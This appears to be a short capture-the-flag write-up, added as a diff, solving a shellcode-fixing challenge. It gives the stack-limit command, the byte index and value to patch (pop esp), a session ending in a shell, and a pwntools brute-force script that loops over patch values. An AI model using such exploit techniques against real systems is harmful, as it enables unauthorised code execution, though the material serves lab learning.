@@ -1,0 +1,31 @@
+ulimit -s unlimited 
+
+change the 15th bit to pop esp (92)
+
+
+What the hell is wrong with my shellcode??????
+I just copied and pasted it from shell-storm.org :(
+Can you fix it for me?
+Tell me the byte index to be fixed : 15
+Tell me the value to be patched : 92
+get shell
+$ 
+
+
+
+Here's a helper script I used to find the solution
+
+from pwn import *
+for i in range(0, 255):
+        sh = process([b"strace", b"./fix"])
+        sh.recv()
+        sh.recv()
+        sh.sendline(b"15")
+
+        print(sh.recv())
+        print(str(i))
+        sh.sendline(str(i))
+
+        sh.interactive()
+        sh.close()
+
